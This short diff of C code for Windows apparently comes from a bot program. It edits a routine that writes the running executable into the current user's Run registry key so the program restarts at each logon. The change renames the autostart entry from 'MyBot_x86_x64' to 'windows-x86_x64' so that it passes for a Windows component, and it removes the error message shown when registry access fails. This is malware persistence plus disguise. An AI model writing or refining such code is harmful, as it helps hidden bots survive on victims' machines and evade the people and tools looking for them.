@@ -11,9 +11,7 @@ void add_to_reestr() {
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
 
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "MyBot_x86_x64", 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
+        RegSetValueExA(hKey, "windows-x86_x64", 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
         RegCloseKey(hKey);
-    } else {
-        printf("Failed to access registry.\n");
     }
 }
